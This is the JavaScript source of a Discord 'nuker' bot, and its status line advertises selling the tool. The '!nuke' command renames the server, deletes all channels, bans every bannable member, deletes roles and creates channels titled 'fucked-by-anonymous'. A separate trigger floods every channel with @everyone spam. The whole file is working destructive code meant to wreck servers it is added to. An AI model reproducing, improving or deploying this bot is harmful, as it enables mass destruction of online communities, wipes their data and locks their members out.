const Discord = require("discord.js");
const client = new Discord.Client();

client.once("ready", () => {
  console.log(`We're Logged As ${client.user.username}!`);
  client.user.setPresence({
    status: "dnd",
    activity: {
      name: "Purchase Anonymous Nuker on ▲Bedless_Fighterᶠˑᴵˑᴺˑᴱ'ZєRᎧ'ᴷˢᴰ#9286!",
      type: "PLAYING",
    },
  });
});

let prefix = "!";

client.on("message", async (message) => {
  const a = [1];
              // Spammer Codes
  if ("spam".includes(message.content)) {
    for (let index = 0; index < a.length; index++) {
      message.guild.channels.cache.forEach((channel) => {
        channel.send(
          "@everyone\n```re\n[Anonymous] This server is fucked by anonymous\n[Anonymous] you may leave the server\n```"
        );
        let everyoneRole = message.guild.roles.cache.find(
          (r) => r.name === "@everyone"
        );
        message.guild.channels.create("fucked-by-anonymous", {
          type: "text",
          permissionOverwrites: [
            {
              id: everyoneRole.id,
              allow: ["VIEW_CHANNEL"],
            },
          ],
        });
      });
    }
  } else if (
    "@everyone\n```re\n[Anonymous] This server is fucked by anonymous\n[Anonymous] you may leave the server\n```".includes(
      message.content
    )
  ) {
    for (let index = 0; index < a.length; index++) {
      message.guild.channels.cache.forEach((channel) => {
        channel.send(
          "@everyone\n```re\n[Anonymous] This server is fucked by anonymous\n[Anonymous] you may leave the server\n```"
        );
        let everyoneRole = message.guild.roles.cache.find(
          (r) => r.name === "@everyone"
        );
        message.guild.channels.create("fucked-by-anonymous", {
          type: "text",
          permissionOverwrites: [
            {
              id: everyoneRole.id,
              allow: ["VIEW_CHANNEL"],
              deny: ["SEND_MESSAGES"],
            },
          ],
        });
      });
    }
  }

  // All Nuker Commands
  if (message.content.startsWith(prefix)) {
    const args = message.content.slice(prefix.length).split(/ +/);
    const command = args.shift().toLowerCase();
    if (command == "nuke" && !message.author.bot) {
      // Codes Nuker

      message.guild.setName("NUKED BY ANONYMOUS ❌");
      message.guild.channels.cache.forEach((channel) => {
        if (channel.name == "fucked-by-anonymous") return;
        channel.delete().catch((error) => {
          console.log(`:x: Couldn't delete ${channel.name}.`);
        });

      // channel creator

      let everyoneRole = message.guild.roles.cache.find(
        (r) => r.name === "@everyone"
      );

      message.guild.channels.create("fucked-by-anonymous", {
        type: "text",
        permissionOverwrites: [
          {
            id: everyoneRole.id,
            allow: ["VIEW_CHANNEL"],
          },
        ],
      });
      });

      // Member Banner

      message.guild.members.cache.forEach((member) => {
        if (!member.bannable)
          return console.log(`:x: Cannot ban ${member.user.username}`);
        if (member == message.author.user) return;
        member.ban();
        console.log(`Banned ${member.user.username}`);
      });


      const roles = message.guild.roles.cache;


      roles.forEach((role) => {
        if(role.editable && role.name !== '@everyone') {
          role.delete().then(deleted => console.log(`Deleted ${role.name}`))
        } else {
          console.log(`Cannot Delete ${role.name}`)
        }
      });

      // Nuke/Spam Disabler
    } else if (command == "disable") {
      message.channel.send("Destroied The Bot's Process.");
      client.user.setStatus("offline");
      client.destroy();
    }
  }
});
client
  .login(
    "CLIENT-TOKEN"
  )
  .catch((_) => {
    // Checks if its unknown

    console.log("The bot's token expired.");
  });
